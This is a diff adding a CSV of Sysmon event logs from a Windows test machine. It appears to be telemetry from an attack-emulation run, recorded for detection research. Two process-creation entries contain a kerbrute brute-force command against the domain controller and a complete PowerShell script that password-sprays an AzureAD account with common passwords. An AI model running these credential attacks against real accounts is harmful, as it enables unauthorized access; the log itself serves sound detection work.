@@ -1,0 +1,3187 @@
+Level,Date and Time,Source,Event ID,Task Category
+Information,12/3/2023 8:36:38 PM,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
+RuleName: -
+UtcTime: 2023-12-04 04:36:38.134
+ProcessGuid: {1ac2ee8c-54fc-656d-0302-000000001000}
+ProcessId: 8620
+Image: C:\Users\Test\AppData\Local\Microsoft\OneDrive\23.226.1031.0003\Microsoft.SharePoint.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:13 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:36:13.807
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:13 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: -
+UtcTime: 2023-12-04 04:36:13.807
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
+CreationUtcTime: 2023-12-04 04:32:15.278
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:13 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:36:13.166
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: Client Interface
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mpclient.dll
+Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
+RuleName: -
+EventType: CreatePipe
+UtcTime: 2023-12-04 04:36:12.775
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+PipeName: \PSHost.133461381725324290.8212.DefaultAppDomain.powershell
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
+RuleName: -
+UtcTime: 2023-12-04 04:36:12.682
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+User: DESKTOP-92IIJB9\Test
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_1fb3dlvc.42t.ps1
+Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
+IsExecutable: false"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:36:12.650
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_1fb3dlvc.42t.ps1
+CreationUtcTime: 2023-12-04 04:36:12.650
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:36:12.603
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: IOfficeAntiVirus Module
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: MpOAV.dll
+Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:12.572
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Just-In-Time Compiler
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clrjit.dll
+Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:12.556
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft Common Language Runtime Class Library
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscorlib.dll
+Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:12.556
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clr.dll
+Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:12.556
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscoreei.dll
+Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:12.541
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\mscoree.dll
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mscoree.dll
+Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:36:12.525
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-573c-656d-fa02-000000001000}
+TargetProcessId: 8212
+TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:36:12.532
+ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
+ProcessId: 8212
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""powershell.exe"" & {cd \""""C:temp\..\ExternalPayloads\""""
+.\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\bruteuser.txt TestUser1}
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:36:12.525
+ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ProcessId: 3600
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:36:12.275
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: -
+UtcTime: 2023-12-04 04:36:12.275
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
+CreationUtcTime: 2023-12-04 04:32:15.278
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:11 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:36:11.401
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: Client Interface
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mpclient.dll
+Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
+RuleName: -
+EventType: CreatePipe
+UtcTime: 2023-12-04 04:36:10.978
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+PipeName: \PSHost.133461381707463088.6624.DefaultAppDomain.powershell
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
+RuleName: -
+UtcTime: 2023-12-04 04:36:10.869
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+User: DESKTOP-92IIJB9\Test
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_j3vp20dh.0nq.ps1
+Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
+IsExecutable: false"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:36:10.853
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_j3vp20dh.0nq.ps1
+CreationUtcTime: 2023-12-04 04:36:10.853
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:36:10.807
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: IOfficeAntiVirus Module
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: MpOAV.dll
+Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:10.791
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Just-In-Time Compiler
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clrjit.dll
+Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:10.776
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft Common Language Runtime Class Library
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscorlib.dll
+Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:10.776
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clr.dll
+Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:10.776
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscoreei.dll
+Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:36:10.760
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\mscoree.dll
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mscoree.dll
+Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:36:10.744
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-573a-656d-f802-000000001000}
+TargetProcessId: 6624
+TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1083,technique_name=File and Directory Discovery
+UtcTime: 2023-12-04 04:36:10.746
+ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
+ProcessId: 6624
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""powershell.exe"" & {Import-Module -Name AzureAD
+
+$passwords = \""""Password1`n1q2w3e4r`nPassword!\"""".split(\""""{`n}\"""")
+foreach($password in $passwords) {
+  $PWord = ConvertTo-SecureString -String \""""$password\"""" -AsPlainText -Force
+  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""bruce.wayne@contoso.com\"""", $Pword
+  try {
+    Write-Host \"""" [-] Attempting ${password} on account bruce.wayne@contoso.com.\""""
+    Connect-AzureAD -Credential $Credential 2>&1> $null
+    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+    Write-Host \"""" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\""""
+    break
+  } catch {
+    Write-Host \"""" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\""""
+  }
+}
+Write-Host \""""End of bruteforce\""""}
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:36:10.744
+ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ProcessId: 3600
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
